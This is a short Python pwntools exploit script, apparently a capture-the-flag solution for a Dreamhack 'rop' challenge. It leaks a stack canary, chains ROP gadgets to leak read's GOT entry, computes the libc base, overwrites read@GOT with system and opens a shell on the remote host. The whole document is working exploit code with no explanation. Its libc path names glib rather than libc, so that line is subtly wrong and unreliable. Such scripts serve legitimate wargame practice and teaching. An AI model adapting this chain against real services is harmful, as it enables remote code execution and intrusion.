from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))
p = remote("host1.dreamhack.games", 11876)
e = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/glib-2.0.so")
# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)
# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1
payload = b"A"*0x38 + p64(cnry) + b"B"*0x8
# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)
# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)
# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(read_plt)
p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read", read)
slog("libc base", lb)
slog("system", system)
p.send(p64(system)+b"/bin/sh\x00")
p.interactive()
